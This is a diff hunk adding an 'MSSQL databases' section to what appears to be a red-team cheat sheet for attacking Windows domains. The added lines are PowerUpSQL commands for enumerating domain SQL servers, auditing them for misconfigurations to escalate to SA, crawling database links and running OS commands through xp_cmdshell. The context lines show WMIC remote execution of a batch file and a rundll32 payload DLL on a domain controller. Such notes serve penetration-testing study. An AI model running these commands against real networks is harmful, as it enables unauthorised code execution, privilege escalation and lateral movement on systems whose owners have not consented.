@@ -237,6 +237,38 @@ wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
 WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
 ```
 
+# MSSQL databases
+
+PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.
+
+
+```cpp
+# Get MSSQL databases in the domain, and test connectivity
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft
+
+# Try to get information on all domain databases
+Get-SQLInstanceDomain | Get-SQLServerInfo
+
+# Get information on a single reachable database
+Get-SQLServerInfo -Instance 'sql-1.cyber.io,1433'
+
+# Scan for MSSQL misconfigurations to escalate to SA
+Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV
+
+#PowerUpSQL automatically crawl database links
+Get-SQLServerLinkCrawl -Instance 'sql-1.cyber.io,1433'
+
+# Execute SQL query
+Get-SQLQuery -Query "SELECT system_user" -Instance sql-1.cyber.io
+
+# Run command (requires XP_CMDSHELL to be enabled)
+Invoke-SQLOSCmd -Instance sql-1.cyber.io -Command "whoami" |  select -ExpandProperty CommandResults
+Invoke-SQLOSCmd -Instance sql-1.cyberbotic.io -Command 'dir C:\' -RawResults
+
+# Automatically find all linked databases
+Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft
+```
+
 # Domain Dominance
 
 # Misc & Encoding
